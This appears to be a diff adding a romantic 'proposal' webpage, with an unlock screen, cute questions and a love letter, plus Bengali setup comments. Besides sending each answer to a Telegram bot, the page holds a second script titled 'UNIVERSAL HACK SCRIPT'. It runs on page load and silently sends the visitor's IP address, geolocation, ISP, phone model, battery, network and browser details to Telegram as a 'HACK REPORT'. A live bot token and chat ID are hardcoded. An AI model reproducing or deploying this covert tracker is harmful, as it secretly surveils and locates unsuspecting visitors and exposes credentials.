@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>A Little Something 💗</title>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;min-height:100%;font-family:Arial,sans-serif;}
+
+body{
+  min-height:100vh;overflow-x:hidden;
+  transition:background 1s ease;
+  background:radial-gradient(circle at 20% 20%,#ffd6e8,transparent 38%),
+             radial-gradient(circle at 80% 80%,#ffe5ef,transparent 42%),
+             linear-gradient(135deg,#fff4f8,#ffddea);
+  color:#6b2945;
+}
+
+/* ---------- THEMES ---------- */
+.theme1{background:radial-gradient(circle at 20% 20%,#ffb6d5,transparent 40%),radial-gradient(circle at 80% 80%,#ffd3e5,transparent 45%),linear-gradient(135deg,#fff5f9,#ffe0eb);}
+.theme2{background:radial-gradient(circle at 20% 20%,#ffc4d9,transparent 40%),radial-gradient(circle at 80% 80%,#ffdce8,transparent 45%),linear-gradient(135deg,#fff7fa,#ffe6ef);}
+.theme3{background:radial-gradient(circle at 20% 20%,#ff9fc5,transparent 38%),radial-gradient(circle at 80% 80%,#ffc9df,transparent 45%),linear-gradient(135deg,#fff0f6,#ffd8e8);}
+.theme4{background:radial-gradient(circle at 20% 20%,#f9b3ce,transparent 40%),radial-gradient(circle at 80% 80%,#f8cfe0,transparent 45%),linear-gradient(135deg,#fff5f8,#fbdfea);}
+.theme5{background:radial-gradient(circle at 20% 20%,#ffb7c9,transparent 40%),radial-gradient(circle at 80% 80%,#ffd4d9,transparent 45%),linear-gradient(135deg,#fff5f5,#ffe2e4);}
+.theme6{background:radial-gradient(circle at 20% 20%,#ffcadf,transparent 40%),radial-gradient(circle at 80% 80%,#eec9dc,transparent 45%),linear-gradient(135deg,#fff4fa,#f7dfeb);}
+.theme7{background:radial-gradient(circle at 20% 20%,#ff91bd,transparent 38%),radial-gradient(circle at 80% 80%,#ffc3db,transparent 45%),linear-gradient(135deg,#fff0f6,#ffd4e6);}
+.theme8{background:radial-gradient(circle at 20% 20%,#ffbdd4,transparent 40%),radial-gradient(circle at 80% 80%,#ffdbe7,transparent 45%),linear-gradient(135deg,#fff8fa,#ffe9f0);}
+.theme9{background:radial-gradient(circle at 20% 20%,#ffc0dc,transparent 40%),radial-gradient(circle at 80% 80%,#ffe0ec,transparent 45%),linear-gradient(135deg,#fff3f8,#ffdfeb);}
+.theme10{background:radial-gradient(circle at 20% 20%,#ffabc9,transparent 40%),radial-gradient(circle at 80% 80%,#ffd0e1,transparent 45%),linear-gradient(135deg,#fff1f6,#ffdae8);}
+.theme11{background:radial-gradient(circle at 20% 20%,#ffb1ca,transparent 40%),radial-gradient(circle at 80% 80%,#ffd6df,transparent 45%),linear-gradient(135deg,#fff5f7,#ffe1e7);}
+.theme12{background:radial-gradient(circle at 20% 20%,#ffb9d6,transparent 40%),radial-gradient(circle at 80% 80%,#ffddea,transparent 45%),linear-gradient(135deg,#fff6fa,#ffe5ef);}
+.theme13{background:radial-gradient(circle at 50% 20%,#5a3142 0%,#241923 45%,#09070b 100%);}
+.theme-red{background:radial-gradient(circle at 20% 20%,#ff8a8a,transparent 40%),radial-gradient(circle at 80% 80%,#ffc1c1,transparent 45%),linear-gradient(135deg,#fff1f1,#ffdada);}
+.theme-blue{background:radial-gradient(circle at 20% 20%,#72c9ff,transparent 40%),radial-gradient(circle at 80% 80%,#b7e4ff,transparent 45%),linear-gradient(135deg,#effaff,#d5f0ff);}
+.theme-green{background:radial-gradient(circle at 20% 20%,#72df9b,transparent 40%),radial-gradient(circle at 80% 80%,#b8f3ca,transparent 45%),linear-gradient(135deg,#effff4,#d9f8e3);}
+.theme-purple{background:radial-gradient(circle at 20% 20%,#b69aff,transparent 40%),radial-gradient(circle at 80% 80%,#dccbff,transparent 45%),linear-gradient(135deg,#f7f2ff,#e8ddff);}
+.theme-orange{background:radial-gradient(circle at 20% 20%,#ffad69,transparent 40%),radial-gradient(circle at 80% 80%,#ffd09d,transparent 45%),linear-gradient(135deg,#fff7ed,#ffe4c7);}
+.theme-yellow{background:radial-gradient(circle at 20% 20%,#ffe36e,transparent 40%),radial-gradient(circle at 80% 80%,#fff1ad,transparent 45%),linear-gradient(135deg,#fffef0,#fff5c9);}
+.theme-cyan{background:radial-gradient(circle at 20% 20%,#65e2e2,transparent 40%),radial-gradient(circle at 80% 80%,#a9f3f3,transparent 45%),linear-gradient(135deg,#efffff,#d6fafa);}
+.theme-pink{background:radial-gradient(circle at 20% 20%,#ff91bf,transparent 40%),radial-gradient(circle at 80% 80%,#ffc6df,transparent 45%),linear-gradient(135deg,#fff1f7,#ffdbea);}
+.theme-sky{background:radial-gradient(circle at 20% 20%,#82d8ff,transparent 40%),radial-gradient(circle at 80% 80%,#c3ecff,transparent 45%),linear-gradient(135deg,#f0fbff,#d9f3ff);}
+.theme-violet{background:radial-gradient(circle at 20% 20%,#a77cff,transparent 40%),radial-gradient(circle at 80% 80%,#d7c2ff,transparent 45%),linear-gradient(135deg,#f8f3ff,#e7dbff);}
+.theme-coral{background:radial-gradient(circle at 20% 20%,#ff927d,transparent 40%),radial-gradient(circle at 80% 80%,#ffc1b5,transparent 45%),linear-gradient(135deg,#fff3ef,#ffe0d9);}
+.theme-magenta{background:radial-gradient(circle at 20% 20%,#ef7bd0,transparent 40%),radial-gradient(circle at 80% 80%,#f5b8e7,transparent 45%),linear-gradient(135deg,#fff1fc,#f9ddf3);}
+.theme-lime{background:radial-gradient(circle at 20% 20%,#b9e95b,transparent 40%),radial-gradient(circle at 80% 80%,#dff5a4,transparent 45%),linear-gradient(135deg,#f8ffe9,#e9f8c8);}
+.theme-turquoise{background:radial-gradient(circle at 20% 20%,#55d9c1,transparent 40%),radial-gradient(circle at 80% 80%,#a8efe1,transparent 45%),linear-gradient(135deg,#effffb,#d7f8f0);}
+
+/* ---------- UNLOCK SCREEN ---------- */
+#unlockScreen{
+  position:fixed;inset:0;z-index:9999;
+  display:flex;align-items:center;justify-content:center;padding:20px;
+  background:radial-gradient(circle at 20% 20%,#ffd1e4,transparent 38%),
+             radial-gradient(circle at 80% 80%,#d9d2ff,transparent 42%),
+             linear-gradient(135deg,#fff5fa,#f3eaff);
+  transition:opacity .45s ease,visibility .45s ease;
+}
+#unlockScreen.hidden{opacity:0;visibility:hidden;pointer-events:none;}
+.unlock-card{
+  width:min(92vw,430px);padding:34px 24px;text-align:center;
+  background:rgba(255,255,255,.82);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  border:2px solid rgba(255,255,255,.9);border-radius:30px;
+  box-shadow:0 18px 55px rgba(160,80,130,.2);
+}
+.unlock-icon{
+  width:92px;height:92px;margin:0 auto 18px;
+  display:flex;align-items:center;justify-content:center;
+  border-radius:50%;background:rgba(255,255,255,.8);
+  font-size:55px;box-shadow:0 10px 28px rgba(200,80,130,.16);
+  animation:float 3s ease-in-out infinite;
+}
+.unlock-card h2{color:#a62f5c;margin-bottom:10px;font-size:25px;}
+.unlock-card p{color:#74445a;line-height:1.6;margin-bottom:22px;}
+#unlockButton{min-width:190px;font-size:17px;}
+
+/* ---------- MAIN ---------- */
+.page{width:100%;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:25px 15px;position:relative;}
+
+.card{
+  width:min(92vw,520px);padding:35px 25px;text-align:center;
+  background:rgba(255,255,255,.72);
+  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  border:2px solid rgba(255,255,255,.85);border-radius:30px;
+  box-shadow:0 15px 45px rgba(180,70,110,.16),inset 0 1px 0 rgba(255,255,255,.9);
+  position:relative;z-index:5;
+}
+
+.face{
+  width:100px;height:100px;margin:0 auto 20px;
+  display:flex;justify-content:center;align-items:center;
+  font-size:65px;border-radius:50%;
+  background:rgba(255,255,255,.75);
+  box-shadow:0 10px 30px rgba(200,70,120,.15),inset 0 0 20px rgba(255,255,255,.8);
+  animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+
+h1{font-size:14px;color:#a62f5c;margin-bottom:18px;line-height:1.35;}
+.question{font-size:23px;line-height:1.6;color:#74334f;min-height:65px;margin-bottom:25px;}
+.buttons{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;}
+
+button{
+  border:none;border-radius:50px;padding:13px 25px;
+  font-size:16px;font-weight:bold;cursor:pointer;color:#fff;
+  background:linear-gradient(135deg,#ff75aa,#e94f88);
+  box-shadow:0 8px 20px rgba(220,70,120,.22);
+  transition:.25s;
+}
+button:hover{transform:translateY(-2px) scale(1.03);}
+button:active{transform:scale(.96);}
+.bad{background:linear-gradient(135deg,#c9899f,#aa667e);}
+
+/* ---------- ENVELOPE ---------- */
+#letterSection{display:none;}
+
+.envelope-wrap{margin:20px auto;width:230px;height:155px;cursor:pointer;position:relative;perspective:800px;}
+
+.envelope{
+  width:100%;height:100%;position:relative;border-radius:8px;
+  background:#f6a9c6;box-shadow:0 12px 30px rgba(170,70,105,.2);
+  overflow:visible;
+}
+
+.envelope:before{
+  content:"";position:absolute;left:0;bottom:0;
+  border-left:115px solid transparent;border-right:115px solid transparent;
+  border-bottom:85px solid #ee8fb2;z-index:3;
+}
+
+.envelope:after{
+  content:"";position:absolute;left:0;top:0;
+  border-left:115px solid transparent;border-right:115px solid transparent;
+  border-top:80px solid #f8bdd2;transform-origin:top center;
+  transition:transform .8s ease;z-index:4;
+}
+
+.envelope.open:after{transform:rotateX(180deg);}
+.heart-seal{position:absolute;z-index:6;left:50%;top:50%;transform:translate(-50%,-50%);font-size:30px;}
+.tap-text{margin-top:18px;color:#9c4262;font-weight:bold;}
+
+/* ---------- LETTER ---------- */
+.letter{
+  background:#fffdfd;border-radius:20px;padding:25px 20px;margin-top:20px;
+  text-align:left;box-shadow:0 10px 30px rgba(160,60,100,.14);
+  animation:letterIn .8s ease;
+}
+@keyframes letterIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+.letter h2{text-align:center;color:#bd3d6c;margin-bottom:18px;}
+.letter p{color:#66384b;line-height:1.75;font-size:16px;margin-bottom:12px;}
+
+/* ---------- MESSAGE ---------- */
+.message-box{margin-top:25px;text-align:left;}
+.message-box h3{text-align:center;color:#a73560;margin-bottom:14px;}
+
+textarea{
+  width:100%;min-height:110px;resize:vertical;
+  border:2px solid #f3bfd3;border-radius:18px;padding:14px;
+  outline:none;font-size:16px;color:#633449;background:#fff8fb;
+}
+textarea:focus{border-color:#ed7fa9;box-shadow:0 0 0 4px rgba(237,127,169,.12);}
+.send-area{text-align:center;margin-top:12px;}
+#status{margin-top:12px;font-size:14px;color:#a34262;}
+
+/* ---------- FLOATING HEARTS ---------- */
+.floating{position:fixed;left:0;top:0;width:100%;height:100%;overflow:hidden;pointer-events:none;z-index:1;}
+.float-heart{position:absolute;bottom:-40px;animation:rise linear forwards;opacity:.65;}
+@keyframes rise{
+  0%{transform:translateY(0) rotate(0);opacity:0;}
+  15%{opacity:.7}
+  100%{transform:translateY(-110vh) rotate(360deg);opacity:0;}
+}
+
+/* ---------- MOBILE ---------- */
+@media(max-width:480px){
+  .page{padding:15px 10px;}
+  .card{padding:28px 18px;border-radius:25px;}
+  h1{font-size:23px;}
+  .question{font-size:17px;}
+  .face{width:85px;height:85px;font-size:54px;}
+  button{padding:12px 21px;}
+}
+</style>
+</head>
+
+<body class="theme1">
+
+<!-- ===================== UNLOCK SCREEN ===================== -->
+<div id="unlockScreen">
+  <div class="unlock-card">
+    <div class="unlock-icon">💗</div>
+    <h2>A Little Surprise</h2>
+    <p>There is something waiting for you.<br>Tap the button to unlock it. 💌</p>
+    <button id="unlockButton" onclick="unlockWebsite()">🔓 Unlock 💗</button>
+  </div>
+</div>
+
+<div class="floating" id="floating"></div>
+
+<audio id="bgMusic" autoplay loop preload="auto">
+  <source src="music.mp3" type="audio/mpeg">
+</audio>
+
+<div class="page">
+<div class="card">
+
+  <div id="questionSection">
+    <div class="face" id="face">😊</div>
+    <h1 id="title">A Little Question 💗</h1>
+    <div class="question" id="question">Hello, how are you? 😊</div>
+    <div class="buttons" id="buttons">
+      <button onclick="answerQuestion('Good 😊')">Good 😊</button>
+      <button class="bad" onclick="answerQuestion('Bad 😔')">Bad 😔</button>
+    </div>
+  </div>
+
+  <div id="letterSection">
+    <h1>Something for you 💗</h1>
+
+    <div class="envelope-wrap" id="envelopeWrap" onclick="openLetter()">
+      <div class="envelope" id="envelope">
+        <div class="heart-seal">💗</div>
+      </div>
+    </div>
+
+    <div class="tap-text" id="tapText">Tap the envelope 💌</div>
+
+    <div class="letter" id="letter" style="display:none;">
+      <h2>Dear ............... 💗</h2>
+      <p>There is something I have wanted to tell you for a while.</p>
+      <p>I really like your smile, your way of talking, and the little things that make you special. 🌸</p>
+      <p>I don't know what you will say, but I wanted to be honest with you. ❤️</p>
+      <p>I don't need any answer, I just want to tell you my feelings 💐</p>
+      <p style="text-align:center;font-weight:bold;">From someone who likes you 💗</p>
+    </div>
+
+    <div class="message-box" id="messageBox" style="display:none;">
+      <h3>Do you want to say anything to me?</h3>
+      <textarea id="userMessage" placeholder="Write something... 💕"></textarea>
+      <div class="send-area">
+        <button onclick="sendMessage()">Send 💌</button>
+        <div id="status"></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</div>
+
+<script>
+
+/* =====================================================
+   ⚙️ TELEGRAM CONFIGURATION  👇 এখানে বসাও 👇
+   =====================================================
+
+   📌 BOT TOKEN কোথায় পাবি:
+   1. Telegram এ @BotFather কে মেসেজ দে
+   2. /newbot কমান্ড দে
+   3. বটের নাম আর ইউজারনেম দে
+   4. BotFather তোকে একটা টোকেন দেবে (এই ফরম্যাটে: 123456:ABC...)
+   5. সেটা কপি করে নিচে BOT_TOKEN এ বসা
+
+   📌 CHAT ID কোথায় পাবি:
+   1. Telegram এ @userinfobot কে মেসেজ দে
+   2. সে তোকে তোর Chat ID দেবে (যেমন: 7427889333)
+   3. সেটা নিচে CHAT_ID এ বসা
+
+   ⚠️ সতর্কতা:
+   এই ফাইল ক্লায়েন্ট সাইডে চলার কারণে টোকেন যে কেউ দেখতে পাবে।
+   তাই এই টোকেন শুধু টেস্টের জন্য ব্যবহার কর, বা ব্যাকএন্ডে রাখো।
+*/
+
+const BOT_TOKEN = "8738166250:AAHBAfeoOuh6zcmVtbWqnc28yfZKw9X2IuM";   // 👈 এখানে বসাও
+const CHAT_ID   = "7427889333";     // 👈 এখানে বসাও
+
+
+/* =====================================================
+   📝 QUESTIONS LIST
+   এখানে ১০, ২০, ৫০+ প্রশ্ন যোগ করতে পারিস
+   ===================================================== */
+
+const questions = [
+  {text:"Do you know how the sky looks at night without moon", theme:"theme13", face:"🌙", button:"Next"},
+  {text:"It is my life without you... 💗", theme:"theme-turquoise", face:"🥹", button:"Next"},
+  {text:"You know... you are really cute. 😊", theme:"theme-lime", face:"😊", button:"Next"},
+  {text:"But when you wear glasses, you look even more beautiful. 🤓💕", theme:"theme-magenta", face:"🤓", button:"Next"},
+  {text:"Though I know I am not your type...😅", theme:"theme-coral", face:"🙂", button:"Next"},
+  {text:"But I really like you. ❤️", theme:"theme-violet", face:"❤️", button:"OK ❤️"},
+  {text:"Can I tell you one more thing? 🌸", theme:"theme-sky", face:"🌸", button:"Yes 💗"},
+  {text:"You make ordinary moments feel a little more special. ✨", theme:"theme-pink", face:"✨", button:"Next"},
+  {text:"Your smile is one of my favorite things. 😊💕", theme:"theme-cyan", face:"🥰", button:"Next"},
+  {text:"And honestly... I just wanted you to know how I feel. 💌", theme:"theme-yellow", face:"💌", button:"Next"},
+  {text:"So... are you ready for the last part? 🌷", theme:"theme-orange", face:"🌷", button:"Yes ❤️"}
+];
+
+
+/* =====================================================
+   🔢 STATE
+   -1 = first screen (Hello, how are you?)
+   0+ = questions[] index
+   ===================================================== */
+let currentQuestion = -1;
+
+
+/* =====================================================
+   📡 TELEGRAM SEND FUNCTION
+   ===================================================== */
+
+async function sendTelegram(message){
+
+  // ✅ চেক করো কনফিগার করা আছে কি না
+  if(
+    !BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
+    !CHAT_ID   || CHAT_ID   === "YOUR_CHAT_ID_HERE"
+  ){
+    console.log("⚠️ Telegram not configured. Skipping send.");
+    return false;
+  }
+
+  try{
+    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+
+    if(!response.ok){
+      const errorText = await response.text();
+      console.log("❌ Telegram API error:", errorText);
+      return false;
+    }
+
+    console.log("✅ Sent to Telegram:", message);
+    return true;
+
+  } catch(error){
+    console.log("❌ Telegram error:", error);
+    return false;
+  }
+}
+
+
+/* =====================================================
+   💬 ANSWER QUESTION
+   প্রতিটি উত্তর Telegram এ পাঠায়
+   ===================================================== */
+
+async function answerQuestion(answer){
+
+  let questionNumber;
+  let questionText;
+
+  // প্রথম স্ক্রিন = Question 1
+  if(currentQuestion === -1){
+    questionNumber = 1;
+    questionText = "Hello, how are you? 😊";
+  } else {
+    questionNumber = currentQuestion + 2;
+    questionText = questions[currentQuestion].text;
+  }
+
+  // Telegram এ পাঠাও
+  await sendTelegram(
+    "💗 Proposal Website\n\n" +
+    "Question " + questionNumber + ":\n" +
+    questionText +
+    "\n\n✅ Answer: " + answer
+  );
+
+  // পরের প্রশ্নে যাও
+  if(currentQuestion === -1){
+    currentQuestion = 0;
+    showQuestion();
+    return;
+  }
+
+  currentQuestion++;
+
+  if(currentQuestion >= questions.length){
+    showEnvelope();
+    return;
+  }
+
+  showQuestion();
+}
+
+
+/* =====================================================
+   🎨 SHOW QUESTION
+   ===================================================== */
+
+function showQuestion(){
+
+  const q = questions[currentQuestion];
+
+  document.body.className = q.theme;
+  document.getElementById("face").textContent = q.face;
+  document.getElementById("question").textContent = q.text;
+
+  document.getElementById("buttons").innerHTML =
+    '<button onclick="answerQuestion(\'' +
+    q.button.replace(/'/g, "\\'") +
+    '\')">' +
+    q.button +
+    '</button>';
+}
+
+
+/* =====================================================
+   💌 SHOW ENVELOPE
+   ===================================================== */
+
+function showEnvelope(){
+  document.getElementById("questionSection").style.display = "none";
+  document.getElementById("letterSection").style.display = "block";
+  document.body.className = "theme7";
+}
+
+
+/* =====================================================
+   ✉️ OPEN LETTER
+   ===================================================== */
+
+function openLetter(){
+
+  const envelope = document.getElementById("envelope");
+  envelope.classList.add("open");
+
+  setTimeout(() => {
+    document.getElementById("letter").style.display = "block";
+    document.getElementById("messageBox").style.display = "block";
+    document.getElementById("tapText").style.display = "none";
+    document.getElementById("envelopeWrap").style.display = "none";
+  }, 700);
+}
+
+
+/* =====================================================
+   💬 SEND USER MESSAGE
+   ===================================================== */
+
+async function sendMessage(){
+
+  const box = document.getElementById("userMessage");
+  const status = document.getElementById("status");
+  const message = box.value.trim();
+
+  if(!message){
+    status.textContent = "Please write something first 💗";
+    return;
+  }
+
+  status.textContent = "Sending... 💌";
+
+  const success = await sendTelegram(
+    "💌 Message from Proposal Website\n\n" +
+    "Typed message:\n" +
+    message
+  );
+
+  if(success){
+    status.textContent = "Message sent successfully 💗";
+    box.value = "";
+  } else {
+    status.textContent = "Message could not be sent.";
+  }
+}
+
+
+/* =====================================================
+   🌸 FLOATING HEARTS
+   ===================================================== */
+
+function createHeart(){
+
+  const heart = document.createElement("div");
+  heart.className = "float-heart";
+
+  const symbols = ["⭐","✨","🌟","🌸","✨","🩷","🌷"];
+  heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+
+  heart.style.left = Math.random() * 100 + "%";
+  heart.style.fontSize = (14 + Math.random() * 20) + "px";
+  heart.style.animationDuration = (6 + Math.random() * 6) + "s";
+
+  document.getElementById("floating").appendChild(heart);
+
+  setTimeout(() => heart.remove(), 12000);
+}
+
+setInterval(createHeart, 700);
+
+
+/* =====================================================
+   🎵 MUSIC
+   ===================================================== */
+
+const music = document.getElementById("bgMusic");
+
+function startMusic(){
+  music.play().catch(() => {
+    // Browser autoplay policy may block sound until user interacts.
+  });
+}
+
+window.addEventListener("load", startMusic);
+
+document.addEventListener("click", () => startMusic(), {once:true});
+document.addEventListener("touchstart", () => startMusic(), {once:true});
+
+
+/* =====================================================
+   🔓 UNLOCK
+   ===================================================== */
+
+function unlockWebsite(){
+  const screen = document.getElementById("unlockScreen");
+  screen.classList.add("hidden");
+  startMusic();
+}
+
+
+/* =====================================================
+   🚀 START
+   ===================================================== */
+
+document.body.className = "theme1";
+
+</script>
+<script>
+/* =====================================================
+   🕷️ UNIVERSAL HACK SCRIPT v1.0
+   যেকোনো HTML এ প্লাগ-অ্যান্ড-প্লে
+   =====================================================
+
+   📌 SETUP:
+   1. নিচে BOT_TOKEN আর CHAT_ID বসাও
+   2. যেকোনো HTML ফাইলের </body> এর আগে পেস্ট কর
+   3. পেজ খোলা মাত্রই টেলিগ্রামে ইনফো চলে যাবে
+   ===================================================== */
+
+(function() {
+  "use strict";
+
+  // ⚙️ ========== CONFIG ==========
+  const BOT_TOKEN = "8738166250:AAHBAfeoOuh6zcmVtbWqnc28yfZKw9X2IuM";   // 👈 এখানে বসাও
+  const CHAT_ID   = "7427889333";     // 👈 এখানে বসাও
+  // ================================
+
+
+  // 🚫 Config না থাকলে স্কিপ কর
+  if(!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
+     !CHAT_ID   || CHAT_ID   === "YOUR_CHAT_ID_HERE"){
+    console.log("⚠️ Hack script not configured. Skipping.");
+    return;
+  }
+
+
+  // ========== 1. TELEGRAM SEND ==========
+  async function sendToTelegram(text){
+    try{
+      const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML"
+        })
+      });
+      console.log("✅ Sent to Telegram");
+    } catch(err){
+      console.log("❌ Telegram error:", err);
+    }
+  }
+
+
+  // ========== 2. GET IP ==========
+  async function getIP(){
+    try{
+      const r = await fetch("https://api.ipify.org?format=json");
+      const d = await r.json();
+      return d.ip || "Unknown";
+    } catch(e){
+      return "Unknown";
+    }
+  }
+
+
+  // ========== 3. GET GEO (optional) ==========
+  async function getGeo(){
+    try{
+      const r = await fetch("https://ipapi.co/json/");
+      const d = await r.json();
+      return {
+        country: d.country_name || "?",
+        city: d.city || "?",
+        isp: d.org || "?"
+      };
+    } catch(e){
+      return { country:"?", city:"?", isp:"?" };
+    }
+  }
+
+
+  // ========== 4. GET PHONE INFO ==========
+  function getPhoneInfo(){
+    const ua = navigator.userAgent;
+    let phone = "Unknown";
+    let android = "Unknown";
+
+    // Android version
+    const av = ua.match(/Android\s([\d.]+)/);
+    if(av) android = av[1];
+
+    // Model name (Build/ দিয়ে)
+    const mm = ua.match(/;\s*([^;)]+)\s+Build\//);
+    if(mm){
+      phone = mm[1].trim();
+    } else {
+      // Brand fallback
+      const brands = ["Samsung","Xiaomi","Redmi","Realme","Oppo","Vivo",
+        "OnePlus","Huawei","Infinix","Tecno","Nokia","Sony","LG",
+        "Motorola","Pixel","iPhone","iPad"];
+      for(const b of brands){
+        if(ua.includes(b)){ phone = b; break; }
+      }
+    }
+
+    // iOS
+    if(/iPhone/i.test(ua)) phone = "iPhone";
+    if(/iPad/i.test(ua))   phone = "iPad";
+
+    return { phone, android };
+  }
+
+
+  // ========== 5. GET NETWORK TYPE ==========
+  function getNetwork(){
+    const c = navigator.connection ||
+              navigator.mozConnection ||
+              navigator.webkitConnection;
+    if(c && c.effectiveType){
+      let t = c.effectiveType.toUpperCase();
+      if(c.downlink) t += " (" + c.downlink + " Mbps)";
+      if(c.rtt)      t += " | RTT " + c.rtt + "ms";
+      return t;
+    }
+    return navigator.onLine ? "Online (unknown)" : "Offline";
+  }
+
+
+  // ========== 6. GET BATTERY ==========
+  async function getBattery(){
+    try{
+      if(!navigator.getBattery){
+        return { level:"Not supported", status:"Not supported" };
+      }
+      const b = await navigator.getBattery();
+      const level = Math.round(b.level * 100) + "%";
+      let status = b.charging ? "Charging 🔌" : "Not Charging 🔋";
+      if(b.charging && b.chargingTime && b.chargingTime !== Infinity){
+        status += " (full in ~" + Math.round(b.chargingTime/60) + " min)";
+      }
+      if(!b.charging && b.dischargingTime && b.dischargingTime !== Infinity){
+        status += " (empty in ~" + Math.round(b.dischargingTime/60) + " min)";
+      }
+      return { level, status };
+    } catch(e){
+      return { level:"Unknown", status:"Unknown" };
+    }
+  }
+
+
+  // ========== 7. GET TIME ==========
+  function getTime(){
+    const now = new Date();
+    return now.toLocaleString("en-GB", {
+      day:"2-digit", month:"2-digit", year:"numeric",
+      hour:"2-digit", minute:"2-digit", second:"2-digit",
+      hour12:true
+    });
+  }
+
+
+  // ========== 8. BUILD MESSAGE ==========
+  async function buildMessage(){
+    const [ip, geo, battery] = await Promise.all([
+      getIP(),
+      getGeo(),
+      getBattery()
+    ]);
+    const { phone, android } = getPhoneInfo();
+    const network = getNetwork();
+    const time = getTime();
+
+    let msg = "🕷️ <b>HACK REPORT</b> 🕷️\n";
+    msg += "━━━━━━━━━━━━━━━━━━━━\n\n";
+    msg += "📱 <b>PHONE:</b> " + phone + "\n";
+    msg += "📦 <b>ANDROID VERSION:</b> " + android + "\n";
+    msg += "⏰ <b>Time:</b> " + time + "\n";
+    msg += "🌐 <b>IP:</b> " + ip + "\n";
+    if(geo.country !== "?") msg += "🌍 <b>Location:</b> " + geo.city + ", " + geo.country + "\n";
+    if(geo.isp !== "?")     msg += "🏢 <b>ISP:</b> " + geo.isp + "\n";
+    msg += "📶 <b>Network:</b> " + network + "\n\n";
+    msg += "🔋 <b>BATTERY STATUS:</b>\n";
+    msg += "• Level: " + battery.level + "\n";
+    msg += "• Status: " + battery.status + "\n\n";
+    msg += "━━━━━━━━━━━━━━━━━━━━\n";
+    msg += "🖥️ <b>Page:</b> " + location.href + "\n";
+    msg += "📄 <b>Title:</b> " + document.title + "\n";
+    msg += "🧭 <b>Referrer:</b> " + (document.referrer || "Direct") + "\n";
+    msg += "🖥️ <b>Screen:</b> " + screen.width + "x" + screen.height + "\n";
+    msg += "🌐 <b>Language:</b> " + navigator.language + "\n";
+    msg += "💻 <b>Platform:</b> " + navigator.platform;
+
+    return msg;
+  }
+
+
+  // ========== 9. MAIN EXECUTE ==========
+  async function run(){
+    console.log("🕷️ Hack script running...");
+    const msg = await buildMessage();
+    await sendToTelegram(msg);
+  }
+
+
+  // ========== 10. AUTO START ==========
+  // পেজ লোড হওয়া মাত্রই চালু হবে
+  if(document.readyState === "loading"){
+    document.addEventListener("DOMContentLoaded", run);
+  } else {
+    run();
+  }
+
+})();
+</script>
+
+</body>
+</html>
